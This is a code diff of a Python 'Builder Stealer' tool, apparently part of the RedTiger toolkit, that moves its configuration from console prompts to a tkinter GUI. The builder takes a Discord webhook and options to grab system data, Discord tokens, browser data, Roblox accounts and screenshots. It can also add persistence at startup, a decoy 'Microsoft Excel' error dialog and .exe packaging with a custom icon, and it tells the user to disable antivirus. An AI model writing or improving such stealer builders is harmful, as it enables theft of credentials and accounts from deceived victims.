@@ -1417,66 +1417,11 @@ while True:
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 
-from Config.Util import *
-from Config.Config import *
-import random
-import os
-import subprocess
-import requests
-import shutil
-from tkinter import Tk, filedialog
-
-Title("Builder Grab")
-
-print(f"""{color.WHITE}                      
-                      ╔═════════════╦══════════════╦══════════════╦═════════════╦═════════════════╗
-                      {color.WHITE}║ {color.RED}System Grab{color.WHITE} ║ {color.RED}Discord Grab{color.WHITE} ║ {color.RED}Browser Grab{color.WHITE} ║ {color.RED}Roblox Grab{color.WHITE} ║ {color.RED}Screenshot Grab{color.WHITE} ║
-                      ╚═════════════╩══════════════╩══════════════╩═════════════╩═════════════════╝
-
-{color.RED}{INFO} Disable your antivirus !""")
-
-webhook = input(f"{color.RED}{INPUT} URL Webhook -> {color.RESET}")
-try:
-    response = requests.head(webhook)
-    if response.status_code != 200:
-       ErrorWebhook()
-    else:
-        print(f"{color.RED}{INFO} Webhook Valid.")
-except:
-   ErrorWebhook()
-   
-print(f"{color.RED}\n{INFO} Custom your grabber:")
-add_system = input(f"{color.RED}{INPUT} Add System Grab ? (y/n) -> {color.RESET}")
-add_discord = input(f"{color.RED}{INPUT} Add Discord Grab ? (y/n) -> {color.RESET}")
-add_browser = input(f"{color.RED}{INPUT} Add Browser Grab ? (y/n) -> {color.RESET}")
-add_roblox = input(f"{color.RED}{INPUT} Add Roblox Grab ? (y/n) -> {color.RESET}")
-add_screenshot = input(f"{color.RED}{INPUT} Add Screenshot Grab ? (y/n) -> {color.RESET}")
-add_startup = input(f"{color.RED}{INPUT} Add Launch at Startup ? (y/n) -> {color.RESET}")
-add_fake_error = input(f"{color.RED}{INPUT} Add Fake Error ? (y/n) -> {color.RESET}")
-add_restart = input(f"{color.RED}{INPUT} Add Restart Every 5min ? (y/n) -> {color.RESET}")
-
-if add_fake_error in ['y', 'Y', 'Yes', 'yes', 'YES']:
-   title_err = input(f"{color.RED}{INPUT} Error message title (enter for default) -> {color.RESET}")
-   descritpion_err = input(f"{color.RED}{INPUT} Description of the error message (enter for default) -> {color.RESET}")
-   if not descritpion_err.strip():
-      descritpion_err = "The file is corrupt and cannot be opened."
-   if not title_err.strip():
-      title_err = "Microsoft Excel"
-else:
-   descritpion_err = []
-   title_err = []
-
-print(f"{color.RED}\n{INFO} Custom your file:")
-exe_or_not = input(f"{color.RED}{INPUT} Converting to .exe (y/n) -> {color.RESET}")
-name_file = input(f"{color.RED}{INPUT} File Name -> {color.RESET}")
-if exe_or_not in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
-    icone = input(f"{color.RED}{INPUT} Add an Icon ? (y/n) -> {color.RESET}")
-
-FakeError = f'''
+FakeError = r'''
 def Fake_Error():
     file = "Error.vbs"
     code = """
-    x=msgbox("{descritpion_err}", 16, "{title_err}")
+    x=msgbox("The file is corrupt and cannot be opened.", 16, "Microsoft Excel")
     """
     try:
         with open(file, "w") as filevbs:
@@ -1487,23 +1432,230 @@ def Fake_Error():
         ()
 '''
 
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 
-if not name_file.strip():
-    random_number = random.randint(1, 1000)
-    name_file = f'BuilderGrab_{random_number}'
+from Config.Util import *
+from Config.Config import *
+import random
+import os
+import subprocess
+import requests
+import shutil
+import tkinter as tk
+from tkinter import filedialog
 
-if exe_or_not in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
-  if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
+Title("Builder Grab")
+
+print(f"""{color.WHITE}                      
+                      ╔═════════════╦══════════════╦══════════════╦═════════════╦═════════════════╗
+                      {color.WHITE}║ {color.RED}System Grab{color.WHITE} ║ {color.RED}Discord Grab{color.WHITE} ║ {color.RED}Browser Grab{color.WHITE} ║ {color.RED}Roblox Grab{color.WHITE} ║ {color.RED}Screenshot Grab{color.WHITE} ║
+                      ╚═════════════╩══════════════╩══════════════╩═════════════╩═════════════════╝
+
+{color.RED}{INFO} Disable your antivirus !
+{color.RED}{INFO} Custom your grabber:""")
+
+
+import tkinter as tk
+from tkinter import filedialog
+from tkinter import ttk
+
+def update_variables():
+    global add_system, add_discord, add_browser, add_roblox, add_screenshot, add_startup, add_fake_error, add_restart, webhook, name_file, exe_or_not
+    add_system = add_system_var.get()
+    add_discord = add_discord_var.get()
+    add_browser = add_browser_var.get()
+    add_roblox = add_roblox_var.get()
+    add_screenshot = add_screenshot_var.get()
+    add_startup = add_startup_var.get()
+    add_fake_error = add_fake_error_var.get()
+    add_restart = add_restart_var.get()
+    webhook = webhook_entry.get()
+    name_file = name_file_entry.get()
+
+
+    if exe_option_var.get() == "Python File":
+        exe_or_not = "Python File"
+    else:
+        exe_or_not = "Exe File"
+    
+    if not name_file.strip():
+        random_number = random.randint(1, 1000)
+        name_file = f'BuilderGrab_{random_number}'
+
+    print("Webhook            :", webhook)
+    print("System Grab        :", add_system)
+    print("Discord Grab       :", add_discord)
+    print("Browser Grab       :", add_browser)
+    print("Roblox Grab        :", add_roblox)
+    print("Screenshot Grab    :", add_screenshot)
+    print("Launch at Startup  :", add_startup)
+    print("Fake Error         :", add_fake_error)
+    print("Restart Every 5min :", add_restart)
+    print("File Type          :", exe_or_not)
+    print("File Name          :", name_file)
+    print("Icon Path          :", icon_path)
+
+    root.quit()
+    root.destroy()
+
+def choose_icon():
+    global icon_path
     try:
-        def choose_folder():
-           root = Tk()
-           root.withdraw()
-           root.attributes('-topmost', True)
-           icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
-           return icon_path
-        icon_path = choose_folder()
+        root = tk.Tk()
+        root.iconbitmap('Img/RedTiger_icon.ico')
+        root.withdraw()
+        root.attributes('-topmost', True)
+        icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
     except:
-        icone = "n"
+        pass
+
+def exe_option_changed(*args):
+    if exe_option_var.get() == "Python File":
+        icon_button.config(state="disabled")
+    else:
+        icon_button.config(state="normal")
+
+
+root = tk.Tk()
+root.iconbitmap('Img/RedTiger_icon.ico')
+root.title(f'{name_tool} {version_tool} | Builder Stealer')
+root.geometry("800x400")
+root.resizable(False, False)
+
+red_color = '#a80505'
+custom_color = "#ffffff"
+custom_font = ("Impact", 30)
+custom_background = "#141414"
+
+root.configure(background=custom_background) 
+
+label_texte = tk.Label(root, text="Builder Options", font=custom_font, background=custom_background, foreground=custom_color)
+label_texte.grid(row=0, column=0, columnspan=2, sticky="n", pady=(10, 0), padx=(140, 20))  # Utilisation de padx pour ajuster la position horizontale
+
+
+def on_entry_focus_in(event):
+    if webhook_entry.get() == "Webhook URL":
+        webhook_entry.delete(0, "end")
+        webhook_entry.config(fg="white")
+
+def on_entry_focus_out(event):
+    if webhook_entry.get() == "":
+        webhook_entry.insert(0, "Webhook URL")
+        webhook_entry.config(fg="white")
+
+webhook_entry = tk.Entry(root, background="#303030", foreground="white", relief="flat", highlightbackground="#383E42", highlightthickness=1.5, font=("Calibri", 12))
+webhook_entry.grid(row=1, column=0, columnspan=2, sticky="ew", padx=(130, 0), pady=10)
+webhook_entry.insert(0, "Webhook URL")
+webhook_entry.bind("<FocusIn>", on_entry_focus_in)
+webhook_entry.bind("<FocusOut>", on_entry_focus_out)
+root.grid_columnconfigure(0, weight=0) 
+webhook_entry.config(width=60)
+
+
+add_system = "None"
+add_discord = "None"
+add_browser = "None"
+add_roblox = "None"
+add_screenshot = "None"
+add_startup = "None"
+add_fake_error = "None"
+add_restart = "None"
+webhook = "None"
+name_file = "None"
+icon_path = ""
+
+add_system_var = tk.StringVar(value="None")
+add_discord_var = tk.StringVar(value="None")
+add_browser_var = tk.StringVar(value="None")
+add_roblox_var = tk.StringVar(value="None")
+add_screenshot_var = tk.StringVar(value="None")
+add_startup_var = tk.StringVar(value="None")
+add_fake_error_var = tk.StringVar(value="None")
+add_restart_var = tk.StringVar(value="None")
+exe_option_var = tk.StringVar(value="Python File")
+
+style = ttk.Style()
+style.configure('Custom.TCheckbutton', font=('Calibri', 18, "bold"), background=root.cget('bg'), foreground=custom_color, relief='raised',indicatorsize=20)
+
+add_system_cb = ttk.Checkbutton(root, text="System Grab", variable=add_system_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
+add_discord_cb = ttk.Checkbutton(root, text="Discord Grab", variable=add_discord_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
+add_browser_cb = ttk.Checkbutton(root, text="Browser Grab", variable=add_browser_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
+add_roblox_cb = ttk.Checkbutton(root, text="Roblox Grab", variable=add_roblox_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
+add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot Grab", variable=add_screenshot_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
+add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
+add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
+add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
+
+add_system_cb.grid(row=4, column=0, padx=(180, 20), sticky="w")
+add_discord_cb.grid(row=5, column=0, padx=(180, 20), sticky="w")
+add_browser_cb.grid(row=6, column=0, padx=(180, 20), sticky="w")
+add_roblox_cb.grid(row=7, column=0, padx=(180, 20), sticky="w")
+add_screenshot_cb.grid(row=4, column=1, padx=(5, 10), sticky="w")
+add_fake_error_cb.grid(row=5, column=1, padx=(5, 10), sticky="w")
+add_startup_cb.grid(row=6, column=1, padx=(5, 10), sticky="w")
+add_restart_cb.grid(row=7, column=1, padx=(5, 10), sticky="w")
+
+
+style = ttk.Style()
+style.configure('Red.TButton', borderwidth=0, background=custom_background, font=('Calibri', 12, "bold"), foreground=custom_background)
+
+def on_entry_focus_in(event):
+    if name_file_entry.get() == "File Name":
+        name_file_entry.delete(0, "end")
+        name_file_entry.config(fg="white")
+
+def on_entry_focus_out(event):
+    if name_file_entry.get() == "":
+        name_file_entry.insert(0, "File Name")
+        name_file_entry.config(fg="white")
+
+name_file_entry = tk.Entry(root, background="#303030", foreground="white", relief="flat", highlightbackground="#383E42", highlightthickness=1.5, font=("Calibri", 12), width=20)
+name_file_entry.grid(row=9, column=0, padx=(60, 0), pady=(20, 10))
+
+name_file_entry.insert(0, "File Name")
+name_file_entry.bind("<FocusIn>", on_entry_focus_in)
+name_file_entry.bind("<FocusOut>", on_entry_focus_out)
+exe_option_var = tk.StringVar(value="File Type")
+
+down_arrow_image = tk.PhotoImage(file="Img/down_arrow.png").subsample(40)
+exe_option_menu = ttk.OptionMenu(root, exe_option_var, *["File Type ", "Python File", "Exe File"], style='Red.TButton')
+exe_option_menu.grid(row=9, column=1, sticky="w", padx=(0, 200), pady=(20, 10))
+
+exe_option_menu.config(compound="right", image=down_arrow_image)
+exe_option_var.trace_add("write", exe_option_changed)
+
+select_icon_image = tk.PhotoImage(file="Img/links_redirection.jpg").subsample(40)
+icon_button = ttk.Button(root, text="Select Icon ", command=choose_icon, style='Red.TButton')
+icon_button.grid(row=9, column=1, sticky="e", padx=(0, 50), pady=(20, 10))
+icon_button.config(compound="right", image=select_icon_image)
+
+if exe_option_var.get() == "Python File":
+    icon_button.config(state="disabled")
+
+root.grid_columnconfigure(0, minsize=0) 
+
+style = ttk.Style()
+style.configure('CustomButton.TButton', borderwidth=0, background=custom_background, font=('Calibri', 15, "bold"), foreground=custom_background)
+
+# Création du bouton avec le style défini
+build_button = ttk.Button(root, text="Build", command=update_variables, style='CustomButton.TButton', width=15)
+build_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(100,0))
+
+
+
+root.mainloop()
+
+
+try:
+    if webhook.lower().startswith("https://discord.com/api/webhooks"):
+        pass
+    else:
+        ErrorWebhook()
+except:
+   ErrorWebhook()
+
 
 file_text_relative = f'./1-File-Output/BuilderStealer/{name_file}.txt'
 file_text = os.path.abspath(file_text_relative)
@@ -1514,42 +1666,43 @@ file_python = os.path.abspath(file_python_relative)
 path_destination_relative = "./1-File-Output/BuilderStealer"
 path_destination = os.path.abspath(path_destination_relative)
 
+
 print(f"{color.RED}{INFO} Installing missing modules:{color.RESET}")
 
 file_bat = os.path.abspath("./Settings/Setup-Builder.bat")
 subprocess.call(file_bat, shell=True)
-
 time.sleep(3)
+
 
 with open(file_text, 'w', encoding='utf-8') as file:
  try:
     file.write(f"webhook_url = \"{webhook}\"")
     file.write(Obligatory)
 
-    if add_system in ['y', 'Y', 'Yes', 'yes', 'YES']:
+    if add_system in ['y']:
         file.write(SystemGrab)
 
-    if add_discord in ['y', 'Y', 'Yes', 'yes', 'YES']:
+    if add_discord in ['y']:
         file.write(DiscordGrab)
 
-    if add_browser in ['y', 'Y', 'Yes', 'yes', 'YES']:
+    if add_browser in ['y']:
         file.write(BrowserGrab)
 
-    if add_roblox in ['y', 'Y', 'Yes', 'yes', 'YES']:
+    if add_roblox in ['y']:
         file.write(RobloxGrab)
 
-    if add_screenshot in ['y', 'Y', 'Yes', 'yes', 'YES']:
+    if add_screenshot in ['y']:
         file.write(ScreenshotGrab)
 
-    if add_startup in ['y', 'Y', 'Yes', 'yes', 'YES']:
+    if add_startup in ['y']:
         file.write(Startup)
 
-    if add_fake_error in ['y', 'Y', 'Yes', 'yes', 'YES']:
+    if add_fake_error in ['y']:
         file.write(FakeError)
 
     file.write(Start)
 
-    if add_restart in ['y', 'Y', 'Yes', 'yes', 'YES']:
+    if add_restart in ['y']:
         file.write(Restart)
  except Exception as e:
     print(f"{color.RED}\n{ERROR} Text file not created: {color.WHITE}{e}")
@@ -1568,6 +1721,7 @@ try:
     print(f"{color.RED}\n{INFO} Python file created: \"{color.WHITE}{file_python}{color.RED}\"")
 except Exception as e:
    print(f"{color.RED}{ERROR} Python file not created: {color.WHITE}{e}")
+
 
 def convert_to_exe(script_name, destination_path, icon_path=None):
     print(f"{color.RED}{INFO} Converting to .exe:{color.RESET}")
@@ -1588,19 +1742,17 @@ def convert_to_exe(script_name, destination_path, icon_path=None):
     except Exception as e:
         print(f"{color.RED}{ERROR} Error during conversion: {color.WHITE}{e}")
 
-if exe_or_not in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
-    if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
-        convert_to_exe(file_python, path_destination, icon_path)
-    else: 
-        convert_to_exe(file_python, path_destination)
+if exe_or_not in ['Exe File']:
+    convert_to_exe(file_python, path_destination, icon_path)
+
 
 print(f"{color.RED}{INFO} Removing temporary files from conversion..{color.RESET}")
-
 try:
     directory = os.getcwd()
-    if exe_or_not in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
+    if exe_or_not in ['Exe File']:
         shutil.rmtree(f"{directory}/build")
         os.remove(f"{name_file}.spec")
+        os.remove(file_python)
     os.remove(file_text)
     print(f"{color.RED}{INFO} Temporary file removed.{color.RESET}")
 except Exception as e:
